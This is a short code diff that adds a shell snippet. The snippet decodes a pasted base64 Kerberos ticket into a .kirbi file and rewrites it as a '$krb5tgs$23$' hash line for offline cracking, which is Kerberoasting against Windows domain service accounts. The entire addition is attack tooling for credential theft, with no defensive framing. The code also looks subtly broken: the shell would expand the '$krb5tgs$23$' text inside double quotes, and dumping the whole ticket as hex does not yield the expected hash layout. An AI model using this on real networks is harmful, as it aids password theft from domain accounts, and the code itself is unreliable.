@@ -1,0 +1,4 @@
+B64_TICKET="ТУТ_ТВІЙ_BASE64"
+
+echo $B64_TICKET | base64 -d > temp.kirbi
+python3 -c "import sys; data = open('temp.kirbi', 'rb').read(); print('$krb5tgs$23$*USER*DOMAIN*SPN*$' + data.hex())" >> my_hashes.txt
